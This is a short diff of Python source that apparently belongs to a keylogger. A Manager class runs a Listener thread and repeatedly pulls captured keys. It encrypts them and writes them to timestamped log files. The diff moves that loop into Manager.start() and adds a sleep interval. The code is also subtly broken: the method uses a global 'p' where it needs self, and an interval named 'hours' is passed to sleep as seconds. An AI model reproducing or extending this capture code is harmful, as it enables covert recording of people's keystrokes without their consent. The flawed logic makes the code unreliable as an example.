@@ -7,13 +7,27 @@ from encrypt import Encryption
 from file_test import log
 
 class Manager:
-    def __init__(self):
+    def __init__(self, hours = 5):
         self.listener = Listener()
         self.process = threading.Thread(target=self.listener.run)
-
+        self.hours = hours
     def start(self):
         self.process.start()
-
+        while True:
+            sleep(self.hours)
+            data = p.listener.get_keys()
+            if data:
+                data = Package(data)
+                package_data = data.export_package()
+                encryptor = Encryption()
+                encryptor.encrypt_text(str(package_data))
+                encrypted_packege = encryptor.encrypted
+                print(package_data)
+                print(encrypted_packege)
+                times = f'{time_stamp2()}.txt'
+                print(times)
+                ett = str(encrypted_packege)
+                log(times, ett)
     def stop(self):
         self.listener.stop()
 
@@ -22,19 +36,3 @@ if __name__ == '__main__':
 
     p = Manager()
     p.start()
-    while 1:
-        sleep(20)
-        data = p.listener.get_keys()
-        if data:
-            a = Package(data)
-            b = a.export_package()
-            e = Encryption()
-            e.encrypt_text(str(b))
-            s = e.encrypted
-            print(b)
-            print(s)
-            times = f'{time_stamp2()}.txt'
-            print(times)
-            ett = str(s)
-            log(times, ett)
-
